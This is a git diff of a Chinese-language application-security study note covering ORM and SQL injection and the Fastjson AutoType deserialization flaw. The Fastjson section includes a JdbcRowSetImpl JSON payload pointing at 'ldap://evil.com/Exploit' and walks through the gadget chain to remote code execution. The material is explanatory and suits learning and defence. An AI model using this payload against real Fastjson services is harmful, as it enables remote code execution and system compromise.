@@ -1,3 +1,4 @@
+# 应用安全
 ## 一 SQL 注入
 ### 为何ORM会被认为是一种可以防御SQL注入的方式
 **一句话：因为ORM是参数化查询（即SQL结构与数据分离）**
@@ -9,10 +10,57 @@ ORM在底层生成SQL时，会使用PreparedStatement（Java）或类似机制�
 1.动态表名/列名排序字段
 原因：参数化查询只能绑定值
 
+## 二 反序列化漏洞
+### Fastjson
+fastjson的AutoType机制引入了@type字段，用于指定待反序列化的类名，在早期的fastjson版本中，fastjson解析到@type时就会**无条件的根据提供的类名去加载并实例化这个类**。
+常见的是，攻击者可以在@type中指定一个危险类（如 com.sun.rowset.JdbcRowSetImpl），并通过精心构造的json触发该类的setter和getter方法，最终执行任意代码。
 
 
-# Claude建议：多租户Agent安全 & SaaS多租户权限架构
+#### 为什么是com.sun.rowset.JdbcRowSetImpl ？
+当你在 JSON 中指定了 @type（例如 {"@type":"com.sun.rowset.JdbcRowSetImpl", ...}）时:
+- 实例化：Fastjson 会通过反射机制调用该类的无参构造方法，将其实例化（此时还没执行 setter）。
+- **扫描与赋值（触发 Setter）**：
+  - Fastjson 会遍历 JSON 字符串中的每一个 Key-Value。
+  - 它会检查目标类（JdbcRowSetImpl）中是否存在与 Key 相对应的 Setter 方法。
+  - 如果 JSON 中有一个键值对是 "dataSourceName": "ldap://..."，Fastjson 就会自动通过反射去调用 setDataSourceName(String) 方法，把参数值赋给对象。
+  - 如果有 "autoCommit": false，就会自动调用 setAutoCommit(boolean) 方法。
 
+JdbcRowSetImpl是 JDK 自带的一个类，它本身并不是恶意代码，但它的某些 Setter 方法内部写了危险的业务逻辑。
+
+攻击者在构造JSON时，通常会包含如下字段：
+```
+{
+    "@type": "com.sun.rowset.JdbcRowSetImpl",
+    "dataSourceName": "ldap://evil.com/Exploit",
+    "autoCommit": false
+}
+
+```
+
+当 Fastjson 解析这个 JSON 时，会依次触发以下流程：
+- 触发 setDataSourceName(String)：
+  - 传入参数 "ldap://[evil.com/Exploit](https://evil.com/Exploit)"。
+  - 该方法会将这个恶意 JNDI 地址赋值给类内部的 dataSourceName 属性。
+    
+- 触发 setAutoCommit(boolean)：
+  - 传入参数 false（或者通过其他方式触发特定的业务方法）。
+  - 关键点：JdbcRowSetImpl 的 setAutoCommit() 方法内部，会调用一个名为 connect() 的私有方法。
+
+在 connect() 方法内部，它会去读取前面被 setDataSourceName 赋过值的 dataSourceName 变量。紧接着，它会执行类似这样的操作： 
+
+```
+InitialContext context = new InitialContext();
+context.lookup(dataSourceName); // 触发 JNDI 查询
+```
+
+因为 dataSourceName 的内容被控制成了攻击者的恶意地址（如 ldap://[evil.com/Exploit](https://evil.com/Exploit)），程序就会向该服务器发起远程的 LDAP/RMI 请求。
+攻击者的服务器返回一个恶意 Class 字节码，本地加载并实例化，从而最终实现远程代码执行（RCE）。
+
+所以这个gadget应该描述为：JdbcRowSetImpl.setDataSourceName ——> JdbcRowSetImpl.setAutoCommit ——> connect() ——> lookup()
+
+
+
+# 多租户Agent安全 & SaaS多租户权限架构
 
 ## 一、多租户Agent安全设计
 
